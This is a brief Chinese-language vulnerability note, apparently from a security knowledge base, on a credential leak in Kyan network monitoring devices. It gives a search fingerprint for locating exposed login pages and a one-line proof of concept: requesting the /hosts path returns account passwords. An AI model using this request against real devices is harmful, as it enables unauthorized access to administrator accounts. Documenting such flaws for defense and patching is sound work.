# Kyan 网络监控设备 hosts 账号密码泄露漏洞

## 漏洞描述

Kyan 网络监控设备 存在账号密码泄露漏洞，攻击者通过漏洞可以获得账号密码和后台权限

## 漏洞影响

<a-checkbox checked>Kyan</a-checkbox></br>

## 网络测绘

<a-checkbox checked>title="platform - Login"</a-checkbox></br>

## 漏洞复现

登录页面如下

![img](../../../.vuepress/public/img/ky-1.png)



POC

```plain
http://xxx.xxx.xxx.xxx/hosts
```



![img](../../../.vuepress/public/img/ky-2.png)



成功获得账号密码